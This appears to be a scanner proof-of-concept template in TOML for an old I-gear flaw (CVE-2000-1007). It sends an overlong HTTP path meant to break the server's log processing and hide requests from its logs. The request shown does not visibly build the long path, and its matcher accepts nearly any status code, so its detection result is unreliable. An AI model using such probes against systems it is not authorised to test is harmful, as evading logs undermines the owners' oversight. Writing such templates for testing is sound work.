[info]
author = "ave"
description = "向 I-gear 服务器发送路径超过 255 字符的 HTTP 请求，触发日志处理模块异常，验证日志记录不完整或失效的问题"
id = "POC-AVE-2000-1046"
name = "I-gear 超长 URL 日志处理异常 PoC"
severity = "medium"
tags = ["ave-2000-1046"]
vuln_id = [
    "CVE-2000-1007",
    "AVE-2000-1046",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    301,
    302,
    400,
    404,
    500,
]
type = "status"
